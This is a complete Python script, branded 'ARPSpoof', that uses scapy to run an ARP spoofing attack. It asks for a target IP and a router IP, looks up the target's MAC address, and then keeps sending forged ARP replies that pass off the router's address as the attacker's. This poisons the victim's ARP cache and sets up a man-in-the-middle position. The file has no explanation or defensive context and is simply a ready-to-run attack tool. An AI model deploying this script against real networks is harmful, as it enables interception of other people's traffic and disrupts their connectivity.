import subprocess, time
import scapy.all as scapy
from termcolor import colored as cl
from pyfiglet import figlet_format as ff

def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    broadcast_arp_request = broadcast/arp_request
    data = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
    mac = data[0][1].hwsrc
    return mac

def arp_spoofing(tip, rip):
    tmac = get_mac_address(tip)
    cnt = 0
    while True:
        try:
            print(cl('='*50, 'red'))
            print(cl(ff('ARPSpoof')+'\n\t\t\t-ARP Spoofing program\n\t\t\t-An AYLIT production', 'red'))
            print(cl('='*50, 'red'))
            packet = scapy.ARP(op=2, pdst=tip, hwdst=tmac, psrc=rip)
            scapy.send(packet, verbose=False)
            cnt += 2
            print(cl(f'Packets sent: {str(cnt)}', 'green'))
            time.sleep(1)
            subprocess.call('clear', shell=True)
        except KeyboardInterrupt:
            print(cl(f'Quitting program...', 'red'))
            break

subprocess.call('clear', shell=True)

print(cl('='*50, 'red'))
print(cl(ff('ARPSpoof')+'\n\t\t\t-ARP Spoofing program\n\t\t\t-An AYLIT production', 'red'))
print(cl('='*50, 'red'))

target_ip = input(cl("Enter the target's IP:", 'yellow'))
router_ip = input(cl("Enter the router's IP:", 'yellow'))
subprocess.call('clear', shell=True)

arp_spoofing(target_ip, router_ip)
